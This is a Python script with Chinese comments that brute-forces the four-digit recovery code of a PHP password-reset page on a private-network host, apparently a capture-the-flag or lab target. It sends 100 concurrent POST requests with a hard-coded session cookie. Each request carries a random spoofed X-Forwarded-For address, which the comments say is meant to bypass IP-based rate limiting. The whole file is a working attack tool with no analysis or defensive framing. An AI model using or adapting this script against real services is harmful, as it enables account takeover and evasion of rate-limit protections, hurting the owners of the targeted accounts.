import aiohttp
import asyncio
import random
from tqdm import tqdm

# 设置目标URL和会话信息
url = "http://10.10.103.186:1337/reset_password.php"
session_cookie = "vhkg33ftkv4o8tqtpkc4gt2uct"  # 替换为您的实际PHPSESSID值
time_limit = 100  # 设定时间限制为100秒
stop_flag = asyncio.Event()

# 生成随机IP地址以绕过IP限制
def generate_random_ip():
    return f"127.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"

# 异步验证码请求函数
async def try_code(session, code, progress_bar):
    if stop_flag.is_set():
        return
    headers = {
        "Host": "10.10.103.186:1337",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://10.10.103.186:1337",
        "Connection": "keep-alive",
        "Referer": "http://10.10.103.186:1337/reset_password.php",
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": generate_random_ip()
    }
    data = f"recovery_code={code:04d}&s=155"
    try:
        async with session.post(url, headers=headers, data=data) as response:
            text = await response.text()
            if "Invalid or expired recovery code!" not in text:
                progress_bar.update(1)
                print(f"\n\033[1;32m[+] 找到有效验证码: {code:04d}\033[0m")
                stop_flag.set()  # 停止其他任务
                return
    except aiohttp.ClientConnectionError:
        print(f"[ERROR] 请求失败: 服务器断开连接")
    except asyncio.TimeoutError:
        print(f"[ERROR] 请求超时")
    finally:
        progress_bar.update(1)

# 异步主函数
async def main():
    tasks = []
    async with aiohttp.ClientSession(cookies={"PHPSESSID": session_cookie}) as session:
        # 初始化进度条
        with tqdm(total=10000, desc="破解进度", unit="code") as progress_bar:
            for code in range(10000):
                if stop_flag.is_set():
                    break
                tasks.append(try_code(session, code, progress_bar))
                if len(tasks) >= 100:  # 控制并发数为100
                    await asyncio.gather(*tasks)
                    tasks = []
            if tasks:
                await asyncio.gather(*tasks)

if __name__ == "__main__":
    print("\033[1;34m[INFO] 脚本开始运行\033[0m")
    asyncio.run(main())
    print("\033[1;34m[INFO] 脚本运行完成\033[0m")
